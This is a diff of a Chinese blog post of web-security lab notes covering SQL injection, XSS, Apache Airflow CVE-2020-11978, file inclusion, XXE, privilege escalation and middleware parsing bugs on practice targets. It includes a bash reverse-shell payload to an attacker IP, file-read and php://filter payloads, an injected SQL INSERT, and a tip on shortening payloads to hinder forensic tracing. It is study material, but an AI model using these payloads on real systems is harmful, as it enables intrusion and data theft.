-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27;;insert into users values(18,&#x27;</span>zhong<span class="string">&#x27;,&#x27;</span>zhong<span class="string">&#x27;)--+</span></span><br></pre></td></tr></table></figure>
-<h3 id="SQL注入类型——宽字节注入-Less-32"><a href="#SQL注入类型——宽字节注入-Less-32" class="headerlink" title="SQL注入类型——宽字节注入(Less-32)"></a>SQL注入类型——宽字节注入(Less-32)</h3><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\80.png" alt></p>
-<h4 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h4><p>%df</p>
-<p>%5c为/</p>
-<h3 id="post注入Less-11"><a href="#post注入Less-11" class="headerlink" title="post注入Less-11"></a>post注入Less-11</h3><p>先抓包再测试</p>
-<h2 id="sqli-labs工具破解"><a href="#sqli-labs工具破解" class="headerlink" title="sqli-labs工具破解"></a>sqli-labs工具破解</h2><h1 id="跨站脚本攻击（XSS）"><a href="#跨站脚本攻击（XSS）" class="headerlink" title="跨站脚本攻击（XSS）"></a>跨站脚本攻击（XSS）</h1><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\81.png" alt></p>
+        <h1 id="跨站脚本攻击（XSS）"><a href="#跨站脚本攻击（XSS）" class="headerlink" title="跨站脚本攻击（XSS）"></a>跨站脚本攻击（XSS）</h1><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\81.png" alt></p>
 <p>常见攻击效果为弹窗。</p>
 <p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\82.png" alt></p>
 <p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\83.png" alt></p>
@@ -700,7 +468,7 @@ MathJax = {
 <p>whoami也常用于查看权限</p>
 <p>查看文件的四个命令：head看前、tail看后、more看长文件用空格翻页</p>
 <h3 id="Apache-Airflow-CVE-2020-11978"><a href="#Apache-Airflow-CVE-2020-11978" class="headerlink" title="Apache Airflow(CVE-2020-11978)"></a>Apache Airflow(CVE-2020-11978)</h3><h4 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>Airflow 是一个使用 python 语言编写的 data pipeline 调度和监控工作流的平台。Airflow 是通过 DAG（Directed acyclic graph 有向无环图）来管理任务流程的任务调度工具， 不需要知道业务数据的具体内容，设置任务的依赖关系即可实现任务调度。</p>
-<p>Apache Airflow是一款开源的，分布式任务调度框架。在其1.10.10版本及以前的示例DAG中存在一处命令注入漏洞，未授权的访问者可以通过这个漏洞在Worker中执行任意命令。</p>
+<p>Apache Airflow是一款开源的，分布式任务调度框架。在其1.10.10版本及以前的示例DAG中存在一处命令注入漏洞（影响版本Apache Airflow &lt;= 1.10.10），未授权的访问者可以通过这个漏洞在Worker中执行任意命令。</p>
 <h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="启动vulhub靶场环境"><a href="#启动vulhub靶场环境" class="headerlink" title="启动vulhub靶场环境"></a>启动vulhub靶场环境</h5><p>进入CVE-2020-11978文件夹：</p>
 <p><img src="F:\blog\source\_posts\漏洞part\228.png" alt=""></p>
 <p>在该处打开终端，输入命令启动：</p>
@@ -729,20 +497,253 @@ MathJax = {
 <p>首先进行在windows环境下nc(netcat)的安装：</p>
 <ul>
 <li>Win10</li>
-<li>netcat-win32-1.11</li>
+<li>netcat-win32-1.12</li>
 </ul>
-<p>攻击机开启nc，监听9999端口：</p>
-<p>用完之后，以免占用内存，先将其停止再删除</p>
+<p><img src="F:\blog\source\_posts\漏洞part\258.png" alt=""></p>
+<p>点击下载，解压到到c盘 users/当前登录用户目录下，并配置环境变量到Path。利用攻击机192.168.223.130开启nc，监听9999端口：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\259.png" alt=""></p>
+<p>在Configuration JSON中输入：</p>
+<p>{“message”:”‘\”;bash -i &gt;&amp; /dev/tcp/192.168.223.130/9999 0&gt;&1;#”}</p>
+<p>点击Trigger执行dag</p>
+<p><img src="F:\blog\source\_posts\漏洞part\260.png" alt=""></p>
+<p>成功反弹shell，便可以命令执行了。</p>
+<p><img src="F:\blog\source\_posts\漏洞part\261.png" alt=""></p>
+<p>用完之后，以免占用内存，先将其停止再删除或sudo docker-compose down</p>
 <p> 停止相关镜像：</p>
 <p>docker stop [CONTAINER ID]</p>
 <p> 删除指定镜像：</p>
 <p>docker rmi -f [IMAGE ID]</p>
-<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p><img src="F:\blog\source\_posts\漏洞part\238.png" alt=""></p>
+<h5 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h5><p>1、升级到1.10.10之后版本<br>2、删除或禁用默认DAG（可自行删除或在配置文件中禁用默认DAGload_examples=False）</p>
+<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p><img src="F:\blog\source\_posts\漏洞part\257.png" alt=""></p>
+<p><img src="F:\blog\source\_posts\漏洞part\238.png" alt=""></p>
 <p><img src="F:\blog\source\_posts\漏洞part\239.png" alt=""></p>
 <p>require()找不到包含文件，该函数会报错；include()不报错，产生警告；有once()参数的文件中的代码只能包含一次。</p>
 <p><img src="F:\blog\source\_posts\漏洞part\240.png" alt=""></p>
 <p><img src="F:\blog\source\_posts\漏洞part\241.png" alt=""></p>
-<h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2></script></p>
+<h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><p>原理：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\263.png" alt=""></p>
+<p>进入靶场，其默认为include.php文件</p>
+<p><img src="F:\blog\source\_posts\漏洞part\262.png" alt=""></p>
+<p>新建一个phpinfo.txt，先写入一句不完整的代码，然后去包含phpinfo.txt：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\264.png" alt=""></p>
+<p><img src="F:\blog\source\_posts\漏洞part\265.png" alt=""></p>
+<p>因代码不符合php规范，故所写的值发现显示在页面上。修改代码：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\266.png" style="zoom:80%;" /></p>
+<p><img src="F:\blog\source\_posts\漏洞part\267.png" alt=""></p>
+<p>因文件包含漏洞，代码被执行（.txt）【无论什么后缀都能当成php执行】</p>
+<p>一般利用该漏洞去读取敏感文件：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\271.png" style="zoom:80%;" /></p>
+<p><img src="F:\blog\source\_posts\漏洞part\273.png" style="zoom:80%;" /></p>
+<p>?page=file://C:\Windows\win.ini</p>
+<p><img src="F:\blog\source\_posts\漏洞part\268.png" alt=""></p>
+<p>若用该方式无法读取源码，则进行转化，读base64编码：</p>
+<p>?page=php://filter/convert.base64-encode/resource=C:\phpstudy_pro\WWW\DVWA\vulnerabilities\fi\source\low.php</p>
+<p><img src="F:\blog\source\_posts\漏洞part\269.png" alt=""></p>
+<p>利用BP解码：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\270.png" alt=""></p>
+<h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><p><img src="F:\blog\source\_posts\漏洞part\272.png" style="zoom:80%;" /></p>
+<p>按照如上代码新建in.php文件：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\274.png" alt=""></p>
+<p>也在相同目录下新建phpinfo.php文件：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\275.png" alt=""></p>
+<h1 id="xxe外部实体注入漏洞"><a href="#xxe外部实体注入漏洞" class="headerlink" title="xxe外部实体注入漏洞"></a>xxe外部实体注入漏洞</h1><p><img src="F:\blog\source\_posts\漏洞part\276.png" alt=""></p>
+<p><img src="F:\blog\source\_posts\漏洞part\277.png" alt=""></p>
+<p>XML用于传输信息，说明与数据库存在交互，在此基础上便可以利用</p>
+<p><img src="F:\blog\source\_posts\漏洞part\278.png" alt=""></p>
+<p>XML标签对大小写敏感</p>
+<p><img src="F:\blog\source\_posts\漏洞part\279.png" alt=""></p>
+<p><img src="F:\blog\source\_posts\漏洞part\280.png" alt=""></p>
+<p>危害：可以用于文件读取</p>
+<h2 id="渗透vulnhub-XXE（靶机一）"><a href="#渗透vulnhub-XXE（靶机一）" class="headerlink" title="渗透vulnhub-XXE（靶机一）"></a>渗透vulnhub-XXE（靶机一）</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>有回显：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/xxe/XXE.zip">https://download.vulnhub.com/xxe/XXE.zip</a></p>
+<p>把下载好的压缩包解压到D盘，迅雷下载中。进入XEE文件夹，右键选择xxe.ovf—&gt;打开方式—&gt;VMware，存储在D盘中</p>
+<p><img src="F:\blog\source\_posts\漏洞part\281.png" alt=""></p>
+<p>导入后便可以打开虚拟机，并且打开虚拟网络编辑器（虚拟机的左上角 编辑 –-&gt;网络虚拟编辑器）设置nat模式，便可以开始使用了</p>
+<p><img src="F:\blog\source\_posts\漏洞part\285.png" alt=""></p>
+<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><h5 id="利用nmap扫描获取ip"><a href="#利用nmap扫描获取ip" class="headerlink" title="利用nmap扫描获取ip"></a>利用nmap扫描获取ip</h5><p>首先要知道网段，查看kali设置，确认为NAT模式</p>
+<p><img src="F:\blog\source\_posts\漏洞part\286.png" alt=""></p>
+<p>便可以在网络虚拟编辑器查看，发现是223网段</p>
+<p><img src="F:\blog\source\_posts\漏洞part\287.png" alt=""></p>
+<p>打开kali在桌面开启终端扫描223网段：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\288.png" alt=""></p>
+<p>128是本机，故确认为131，且其80端口开放，尝试用windows10访问</p>
+<p><img src="F:\blog\source\_posts\漏洞part\289.png" alt=""></p>
+<p>看到页面不知道要做什么。</p>
+<h5 id="利用nmap看是否存活"><a href="#利用nmap看是否存活" class="headerlink" title="利用nmap看是否存活"></a>利用nmap看是否存活</h5><p><img src="F:\blog\source\_posts\漏洞part\290.png" alt=""></p>
+<h5 id="利用nmap扫描端口"><a href="#利用nmap扫描端口" class="headerlink" title="利用nmap扫描端口"></a>利用nmap扫描端口</h5><p>若不写-p则扫描默认端口；故可以用-p指定端口（如果是全端口扫描则共有65535个）</p>
+<p>nmap -p 1-65535 192.168.223.0/24</p>
+<h5 id="利用dirb扫描目录"><a href="#利用dirb扫描目录" class="headerlink" title="利用dirb扫描目录"></a>利用dirb扫描目录</h5><p>dirb <a target="_blank" rel="noopener" href="http://192.168.223.131">http://192.168.223.131</a></p>
+<p>其原理是通过字典进行扫描</p>
+<p>根据扫描结果中返回的状态码（code）进行判断【主要看2-；404：资源不存在，不需要看；3-说明可能存在跳转】【若无2-、3-，可以尝试利用403，403说明无权访问资源，可以想办法绕过】【200说明服务器成功返回网页】</p>
+<p><img src="F:\blog\source\_posts\漏洞part\291.png" alt=""></p>
+<p>同样用windows10访问：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\292.png" alt="">发现有xxe，不是因为字典没有，是因为其写在Disallow（不被发现)，故通过扫描工具是扫描不到该路径的，尝试访问xxe：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\293.png" alt=""></p>
+<p>出现了不一样的页面【正常情况下看到登录框，想到弱口令、万能密码、sql注入，尝试是否可以登录到后台】</p>
+<p>因前面出现了xxe该处直接进行测试即可</p>
+<h4 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>接下来探测xxe，用BP抓包：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\294.png" alt=""></p>
+<p>首先，发现标签为XML样式，说明可能存在xxe漏洞</p>
+<p>若没有红框这句话，也可以通过&lt;&gt;做出初步判断【因登录框处，一般是写为uname=admin&amp;passwd=12321&amp;submit，而此处出现了标签，形式不一样】</p>
+<p>进一步的，发送到Repeater将Content-Type中的text/plain修改为text/xml，Send后看其是否支持接受</p>
+<p><img src="F:\blog\source\_posts\漏洞part\295.png" alt=""></p>
+<p>发现返回200，说明支持。找到xee漏洞后，便可以进行利用。</p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>在Repeater中将攻击代码输入进行文件etc/passwd读取，点击Send：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\296.png" alt=""></p>
+<p>在攻击代码中，admin出现的两处可以修改，一致即可。其中攻击代码越少越好，只要能达到攻击目的就行。【这样，溯源研判时提取到的信息就越少，不易暴露】</p>
+<p>读取到了，至此靶场做完。</p>
+<h3 id="延申-2"><a href="#延申-2" class="headerlink" title="延申"></a>延申</h3><h4 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h4><p>刚刚在robots.txt中Disallow里面还发现了admin.php，在浏览器中克隆一个标签页进行访问，发现还有一个登录框：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\297.png" alt=""></p>
+<p>想获取用户名和密码，还是通过源码审计admin.php。读源码要通过base64编码读取admin.php的源码：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\298.png" alt=""></p>
+<p>选中，Send to Decoder，将其放到解码器中去，利用base64解码：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\299.png" alt=""></p>
+<p>复制到记事本中查看源码，此时还不知道需要找什么。发现源码中出现了username和password：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\300.png" alt=""></p>
+<p>其中pw需要md5解密</p>
+<p>www.cmd5.com</p>
+<p><img src="F:\blog\source\_posts\漏洞part\301.png" alt=""></p>
+<p>由此得到账号密码后便尝试登录，登录成功：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\302.png" alt=""></p>
+<p>点击flag但是找不到：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\303.png" alt=""></p>
+<p>之前没扫出来flagmeout.php文件，正也说明了找不到</p>
+<p>flagmeout.php藏在xee中，flag又藏在源代码中：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\306.png" alt=""></p>
+<p>查看页面源代码得到flag</p>
+<p><img src="F:\blog\source\_posts\漏洞part\307.png" alt=""></p>
+<h4 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二"></a>方法二</h4><p>或者使用另一种方法</p>
+<p>源码中显示直接跳转到flagmeout.php中，于是可以获得读文件的权限，直接读取，不需要用户名与密码：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\308.png" alt=""></p>
+<p><img src="F:\blog\source\_posts\漏洞part\309.png" alt=""></p>
+<p>选中后发到解码器：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\310.png" alt=""></p>
+<h2 id="play-xxe（靶机二）"><a href="#play-xxe（靶机二）" class="headerlink" title="play_xxe（靶机二）"></a>play_xxe（靶机二）</h2><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p>利用迅雷下载</p>
+<p>无回显：<a target="_blank" rel="noopener" href="https://isos.pentesterlab.com/play_xxe.iso">https://isos.pentesterlab.com/play_xxe.iso</a> 具有一定的特殊性<br>在VMware选择新建虚拟机，选择典型模式即可</p>
+<p><img src="F:\blog\source\_posts\漏洞part\282.png" style="zoom:67%;" /></p>
+<p>.iso要选择linux ubuntu才能正常打开：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\283.png" style="zoom:67%;" /></p>
+<p><img src="F:\blog\source\_posts\漏洞part\284.png" style="zoom:67%;" /></p>
+<h3 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h3><p>打开play_xxe，不知道会启动到什么程度，把ip扫出来即可（本次play_xxe也可直接查ip）</p>
+<p><img src="F:\blog\source\_posts\漏洞part\311.png" alt=""></p>
+<p><img src="F:\blog\source\_posts\漏洞part\312.png" alt=""></p>
+<p><img src="F:\blog\source\_posts\漏洞part\331.png" alt=""></p>
+<p>确定ip为132，且80端口也开启</p>
+<p>用windows尝试访问ip，发现该页面提示为XML：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\313.png" style="zoom:80%;" /></p>
+<p>也发现了登录页面（一般利用的地方便是登录处【传输数据的地方】），点击后出现了登录框。</p>
+<h4 id="方法一-2"><a href="#方法一-2" class="headerlink" title="方法一"></a>方法一</h4><p>根据前面的XML提示，进行抓包：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\314.png" alt=""></p>
+<p><img src="F:\blog\source\_posts\漏洞part\316.png" alt=""></p>
+<p>发现红框的方式都能被接受，加上提示，已经很明显了</p>
+<p>也可以发到Repeater，进一步测试（将Content-Type改为text/xml）后Send，看是否能够出结果：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\317.png" alt=""></p>
+<p>错误的请求，将Content-Type改为application/xml后Send：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\318.png" alt=""></p>
+<p>状态码为200，说明xml可以利用，这种有回显的先尝试读取文件：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\319.png" alt=""></p>
+<p>虽然已经被指定，但是其不会返回到页面显示，一般尝试把application改为text，发现仍没有：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\320.png" alt=""></p>
+<p>情况相同，确认类型为：没有回显</p>
+<p><img src="F:\blog\source\_posts\漏洞part\321.png" alt=""></p>
+<p>kali上写一个test.dtd文件（XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素），用于接收数据，即通过靶机发送请求，请求服务器的text.dtd文件。：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\322.png" alt=""></p>
+<p>故要开启网站80端口（启动的位置要在.dtd目录下，不然访问不到，即在哪里目录下写命令，打开的便是哪个页面），开启kali的http服务：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\323.png" alt=""></p>
+<p>接着在Windows上访问kali的ip（在那个地方开启服务，便访问哪里）【Windows便可以直接下载文件，这也是文件传输的一种方式】：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\324.png" style="zoom:67%;" /></p>
+<p>这样就可以执行payload：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\325.png" alt=""></p>
+<p>回到kali查看：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\326.png" alt=""></p>
+<p>发现为etc/passwd的数据，实现成功</p>
+<p>为什么会报404：</p>
+<p>因为在text.dtd中访问的是xxe.php，但是kali没有xxe.php故会报404。主要是执行p1，故这个文件名可以随便写。</p>
+<h4 id="方法二-2"><a href="#方法二-2" class="headerlink" title="方法二"></a>方法二</h4><p>利用wireshark选网卡后进行抓包</p>
+<p>打开wireshark：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\327.png" alt=""></p>
+<p>选择网卡：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\328.png" alt=""></p>
+<p>再用Windows中BP发一个请求，用wireshark抓到了该条数据</p>
+<p><img src="F:\blog\source\_posts\漏洞part\329.png" alt=""></p>
+<p>双击进入查看：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\330.png" alt=""></p>
+<p>所有网站访问、网络请求等与流量访问有关联的行为，选择正确的网卡，wireshark都可以抓到。</p>
+<h2 id="xxe（靶场三）"><a href="#xxe（靶场三）" class="headerlink" title="xxe（靶场三）"></a>xxe（靶场三）</h2><p>利用xxe执行系统命令&amp;内网探测</p>
+<p>输入数据打开抓包，去抓一下</p>
+<p>发送到Repeater中，通过端口探测或者存活探测发现不能用</p>
+<h2 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h2><h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h1><p>序列化：把一个对象变成可以传输的字符串或数组</p>
+<p>反序列化：将对象的状态信息转换为对象（可以存储或传输的形式）</p>
+<p>s:string</p>
+<p>o:object</p>
+<p><img src="F:\blog\source\_posts\漏洞part\304.png" alt=""></p>
+<p><img src="F:\blog\source\_posts\漏洞part\305.png" alt=""></p>
+<h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h1><h2 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><p>越权漏洞的成因主要是开发⼈员在对数据进行增、删、改、查询时对客户端请求的数据过分相信，而遗漏了权限的判定。</p>
+<p>在实际的代码审计中，这种漏洞往往很难通过⼯具进行自动化监测，因此在实际应用中危害很大。其与未授权访问有⼀定差别。</p>
+<p>目前存在着两种越权操作类型，横向越权操作（水平越权）和纵向越权操作（垂直越权）。</p>
+<p>⼀般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方。如：改用户的id、用户名就可以获取或修改别⼈的信息。</p>
+<h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>当用户1对用户2的信息进行修改、删除、访问等操作，若两用户权限不同，即为垂直越权；若两用户权限相同，则为水平越权。</p>
+<h4 id="catfish垂直越权"><a href="#catfish垂直越权" class="headerlink" title="catfish垂直越权"></a>catfish垂直越权</h4><h5 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h5><p>将Catfishcms_v4.5.4放在WWW目录下，同样访问127.0.0.1/Catfishcms_v4.5.4会出现安装界面：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\342.png" alt=""></p>
+<p>安装完成，可以登录phpmyamin中查看是否数据库catfish创建成功</p>
+<p><img src="F:\blog\source\_posts\漏洞part\343.png" alt=""></p>
+<p>进入后台并登录【漏洞点在后台——用户管理——管理后台用户】</p>
+<h5 id="操作-2"><a href="#操作-2" class="headerlink" title="操作"></a>操作</h5><p>目标：通过用户user的权限修改admin管理员的页面</p>
+<p>首先添加一个后台用户：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\344.png" alt=""></p>
+<p>由此，便可在管理后台用户界面查看该用户的信息。</p>
+<p>在另外一个浏览器，登录刚刚添加的后台用户，再写一篇文章，便可以在所有文章模块中进行编辑（修改标题），先输入好未进行修改：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\345.png" alt=""></p>
+<p>回到amin界面，想获得其的特征值（id值），编辑一篇由admin写的文章，进行抓包：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\346.png" alt=""></p>
+<p>得到了postId值为4后【识别文章的标识符是postId，即通过其来识别】，正常放包。</p>
+<p>再到后台用户user端写文章【为显示方便只修改标题】，进行抓包，将postId改为admin端的值，再次放包，此时user端没有说明变化，回到admin端查看，发现原来admin的文章改变了。</p>
+<h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><h4 id="yxcms水平越权"><a href="#yxcms水平越权" class="headerlink" title="yxcms水平越权"></a>yxcms水平越权</h4><h5 id="安装-3"><a href="#安装-3" class="headerlink" title="安装"></a>安装</h5><p>首先将YXcms放在WWW文件夹下，在小皮中的软件管理中安装phpMyAdmin（网页管理数据库的工具）到WWW路径下：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\332.png" alt=""></p>
+<p><img src="F:\blog\source\_posts\漏洞part\333.png" alt=""></p>
+<p>直接访问127.0.0.1/yxcms，会出现安装向导，跟着安装即可：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\337.png" alt=""></p>
+<p>安装完成后，先进入前台【漏洞点在前台】，注册一个账号t1：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\335.png" alt=""></p>
+<p><img src="F:\blog\source\_posts\漏洞part\336.png" alt=""></p>
+<h5 id="操作-3"><a href="#操作-3" class="headerlink" title="操作"></a>操作</h5><p>目标：通过一个账户修改另一个账户的信息</p>
+<p>再开一个浏览器，注册另一个账号t2：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\338.png" alt=""></p>
+<p>利用修改密码界面，把t2的信息调出：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\339.png" alt=""></p>
+<p>回到t1账户，执行相同的操作，并随意写入电话号码，进行抓包，通过修改nickname（可获取）、id（可以采取爆破的方式），然后释放即关闭抓包：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\340.png" alt=""></p>
+<p>回到t2页面刷新，同样用修改密码的方式调出个人信息，发现值被修改：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\341.png" alt=""></p>
+<p>回顾：通过在t1处转包改包，将id值定位到t2，相当于可以把t2的信息进行修改。</p>
+<p>另，登录phpMyAdmin的账号密码同数据库：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\334.png" alt=""></p>
+<h1 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h1><p>如：IIS、Apache、Nginx</p>
+<p>有些漏洞不是出现在网页上的，而是因为我们使用了这些中间件，产生了漏洞，且不同版本解析的漏洞不一致。</p>
+<h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><h3 id="IIS6-0解析漏洞："><a href="#IIS6-0解析漏洞：" class="headerlink" title="IIS6.0解析漏洞："></a>IIS6.0解析漏洞：</h3><p>文件解析：上传⽂件，命名为：aa.asp;.jpg【会被解析为.asp文件、识别到;便以为文件读完；但上传时检测后缀，认为是.jps】</p>
+<p>⽂件夹解析：新建⽂件夹:aaa.asp,⽂件夹下的所有⽂件都会被当成asp去解析</p>
+<h3 id="IIS7-5解析漏洞："><a href="#IIS7-5解析漏洞：" class="headerlink" title="IIS7.5解析漏洞："></a>IIS7.5解析漏洞：</h3><p>上传文件：aaa.jpg，访问路径：UploadFiles/image/aaa.jpg/1.php【正常上传.jpg图片文件（含一句话木马等），但访问时加上即使不存在的1.php，会被当做php脚本】</p>
+<h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><h3 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h3><p>上传⽂件：a.php.xxx（用未限制的后缀xxx绕过黑名单）。apache解析原理：从右往左解析，解析不了，继续向前解析</p>
+<h3 id="操作-4"><a href="#操作-4" class="headerlink" title="操作"></a>操作</h3><p>启动phpStudy（PHP5.2.17），在WWW目录下上传phpinfo.php.qwe</p>
+<p><img src="F:\blog\source\_posts\漏洞part\347.png" alt=""></p>
+<p>但是访问时发现会被当为php解析</p>
+<p><img src="F:\blog\source\_posts\漏洞part\348.png" alt=""></p>
+<p>在没有漏洞处尝试，发现会报错，无法解析。</p>
+<h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><p>nginx解析漏洞：上传abc.png图⽚，访问路径：/abc.png/.php便会当作php执行</p>
+<h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><p>tomcat后台弱⼝令：登陆后台，上传war包</p>
+<h3 id="vulhub漏洞复现——Tomcat7-弱密码-amp-amp-后端Getshell漏洞"><a href="#vulhub漏洞复现——Tomcat7-弱密码-amp-amp-后端Getshell漏洞" class="headerlink" title="vulhub漏洞复现——Tomcat7+弱密码&amp;&amp;后端Getshell漏洞"></a>vulhub漏洞复现——Tomcat7+弱密码&amp;&amp;后端Getshell漏洞</h3><h4 id="环境启动"><a href="#环境启动" class="headerlink" title="环境启动"></a>环境启动</h4><p>使用docker搭建漏洞靶场环境</p>
+<p><img src="F:\blog\source\_posts\漏洞part\349.png" alt=""></p>
+<p>进入对应文件夹，打开终端，输入命令启动，再获取端口号（一般tomcat默认在8080端口）：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\350.png" alt=""></p>
+<p>在浏览器打开，正常访问tomcat页面：</p>
+<p><img src="F:\blog\source\_posts\漏洞part\351.png" alt=""></p>
+<p>点击<code>Manager App</code>登录，默认用户名密码<code>tomcat:tomcat</code></p>
+<p><img src="F:\blog\source\_posts\漏洞part\352.png" alt=""></p>
+<p><img src="F:\blog\source\_posts\漏洞part\353.png" alt=""></p>
+<h4 id="后台Getshell"><a href="#后台Getshell" class="headerlink" title="后台Getshell"></a>后台Getshell</h4><p>登录到后台后可以通过部署war包【war 包是 Sun 提出的一种 web 应用程序格式。它与 jar 类似，是很多文件的压缩包】进行getshell</p>
+<h5 id="准备jsp木马"><a href="#准备jsp木马" class="headerlink" title="准备jsp木马"></a>准备jsp木马</h5><p>利用.jsp一句话木马：</p>
+<p>将其压缩，将.zip后缀改为.war</p>
+<p>打开蚁剑，右键，编辑数据，将连接类型改为jsp</p>
+</script></p>
       </div>
       
         <div class="prev-or-next">
@@ -779,7 +780,7 @@ MathJax = {
   <div class="post-catalog hidden" id="catalog">
     <div class="title">Contents</div>
     <div class="catalog-content">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%EF%BC%88SQL-Injection%EF%BC%89"><span class="toc-text">SQL注入（SQL Injection）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89%EF%BC%88%E8%BF%87%E7%A8%8B%EF%BC%89"><span class="toc-text">定义（过程）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%A2%E6%88%90%E5%8E%9F%E5%9B%A0"><span class="toc-text">形成原因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E8%BF%87%E7%A8%8B"><span class="toc-text">常见过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-injection%E5%8F%82%E6%95%B0"><span class="toc-text">SQL injection参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 